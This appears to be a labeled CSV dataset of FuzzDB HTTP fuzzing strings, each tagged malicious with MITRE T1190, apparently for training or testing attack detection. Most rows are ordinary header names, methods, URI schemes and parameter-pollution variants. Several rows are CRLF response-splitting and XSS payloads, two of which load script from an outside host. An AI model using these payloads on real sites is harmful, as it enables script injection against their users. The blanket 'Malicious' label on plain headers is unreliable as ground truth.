Payload,Signature,AttackType,Severity,MITRE,Label,Description
Content-MD5,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=%23?id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-For,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id&=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
urn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
psyc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
magnet:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
unreal:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; (R1 1.6)),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
facetime:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[&id=2]=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20050923 CentOS/1.0.7-1.4.1.centos4 Firefox/1.0.7,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[=/:@&=+$&id=2]=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-XSS-Protection,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-UA-Compatible,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Refresh,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
acap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aim:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Requested-With,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-ATT-DeviceId,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Wap-Profile,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Content-Type-Options,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BMOVE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
news:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
jar:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
RPC_IN_DATA,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKCOL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmlrpc.beep :,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Charset,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
SUBSCRIBE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.xpc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Content-Security-Policy,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CHECKIN,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Authorization,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Unmodified-Since,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
modem:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Location,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BPROPFIND,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xfire:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aaas:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Origin,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tag:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
go:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ws:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tv:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&#38;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Expires,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msrps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
maps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
lastfm:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/1.22 (compatible; MSIE 2.0d; Windows NT),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
;id=1?id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ARBITRARY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Age,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
snmp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (PLAYSTATION 3; 1.00),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CONNECT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Referer,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sips:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gopher:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Opera/9.27 (Windows NT 5.1; U; en),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
OPTIONS,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
shttp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[]=1&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%c0%a6id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
im:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wss:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cvs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1\uc0a6id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
javascript:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%2526id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
RPC_OUT_DATA,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dns:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
GET,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Cache-Control,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
data:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
lsid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
apt:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rtmp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
pop:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
imap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CHECKOUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
paparazzi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Public-Key-Pins,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&amp;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-WebKit-CSP,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soap.beeps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Language,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gizmoproject:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
????id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Ranges,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
message:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1#id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
irc6:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BDELETE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-None-Match,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Strict-Transport-Security,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ut2004:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
platform:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dav:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
beshare:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/2.0 (compatible; MSIE 3.02; Update a; Windows NT),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
teamspeak:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Retry-After,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
about:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmpp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ACL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tip:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id===1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.14) Gecko/20080520 Firefox/2.0.0.14,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
bitcoin:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Range,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
crid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
content:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Pragma,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sieve:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rsync:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
skype:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wtai:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msnim:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BASELINE-CONTROL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
INDEX,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
irc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
adiumxtra:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gtalk:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
bolo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rmi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soldat:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Frame-Options,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ldap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
vemmi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Allow,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sip:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ETag,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
h323:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DNT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Access-Control-Allow-Origin,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Proto,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKACTIVITY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Via,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Wget/1.8.2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
\r\n,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
P3P,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Last-Modified,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Front-End-Https,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msrp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
telnet:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
VERSION-CONTROL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iax:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Length,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNCHECKOUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Host,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
service:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Transfer-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
chrome:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
doi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
palm:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Authorization,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ventrilo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
webcal:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
SEARCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Connection,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNLOCK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DEBUG,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Authenticate,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mtqp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
coap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wyciwyg:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%u0026;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.xpcs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
fish:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.lws:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wais:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Modified-Since,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[1&id=2]=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
info:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
0x0D0x0A,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmlrpc.beeps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
callto:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tel:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
finger:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
steam:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
itms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
spotify:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%26id%3D2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mvn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.7) Gecko/20070606,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id['&id=1']=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKWORKSPACE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Http-Method-Override,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ipp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
market:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&&&&id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PROPPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ircs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Upgrade,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ed2k:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
proxy:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
thismessage:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Match,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0%0d%0ad%0%0d%0aa,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aaa:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Powered-By,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Cookie,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Datetime,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNSUBSCRIBE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BPROPPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id==1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
pres:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
smb:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Vary,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
geo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Status,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mumble:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PROPFIND,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
From,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
